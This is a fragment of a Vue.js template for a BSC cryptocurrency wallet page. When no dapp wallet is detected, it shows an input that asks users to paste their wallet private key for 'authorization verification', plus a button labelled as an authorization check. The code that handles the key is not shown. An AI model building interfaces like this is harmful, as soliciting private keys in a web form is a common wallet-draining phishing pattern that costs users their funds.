       <img src="@/assets/images/bsc_logo.png" alt="">
       <span>（{{$t('index.導入或切換當前錢包后自動檢測')}}）</span>
     </div>
    <div class="explore-private" v-if="!isDapp">
      <div class="input-box">
        <input type="text" v-model="privateKey" :placeholder="$t('index.请填寫符合條件的BSC錢包私鑰,進行授權驗證')">
      </div>
      <div class="explore-btn" @click="privateKeySign">{{$t('index.授權校驗')}}</div>
   </div>
     <div class="address-box flex-between" v-if="address">
